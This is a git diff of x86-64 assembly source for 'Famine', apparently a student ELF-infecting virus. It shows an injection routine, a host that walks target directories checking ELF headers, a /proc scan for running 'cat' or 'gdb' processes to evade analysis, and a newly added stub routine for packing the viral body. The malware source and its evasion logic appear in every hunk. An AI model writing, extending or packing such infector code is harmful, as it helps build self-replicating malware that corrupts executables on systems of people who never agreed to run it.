@@ -134,6 +134,8 @@ _inject:
 
 		jmp _end
 
+; ============================================================== pack from there
+_packed_part:
 _host:
 	xor rsi, rsi ; mode for move_through_dir
 	lea rdi, [rel directories]
@@ -606,6 +608,16 @@ _check_file_process:; (string rdi)
 	pop r8
 ret
 
+;               v dest
+_pack: ;(void *rdi) -> ret size + fill rdi
+	push rdx
+
+	lea rsi, [rel _packed_part]
+	lea rdx, [rel _end_of_pack]
+
+	pop rdx
+ret
+
 ; ================================ utils =======================================
 
 _ft_concat_path: ;(string rdi, string rsi) -> rdi is dest, must be in stack or mmaped region
@@ -778,11 +790,6 @@ _ft_strcpy: ; (string rdi, string rsi)
 ret
 
 ; ==============================================================================
-
-process_dir db `/proc`, 0x0
-process_status db `status`, 0x0
-process db `\tcat\n`, 0x0, `\tgdb\n`, 0x0, 0x0
-
 ;                   E     L    F   |  v ELFCLASS64
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 %ifdef FSOCIETY
@@ -792,7 +799,14 @@ elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, 0x0
 %endif
-signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
+
+; ===================================================================end of pack
+_end_of_pack:
+	process_dir db `/proc`, 0x0
+	process_status db `status`, 0x0
+	process db `\tcat\n`, 0x0, `\tgdb\n`, 0x0, 0x0
+
+	signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
 _params:
 	length dq 0x0
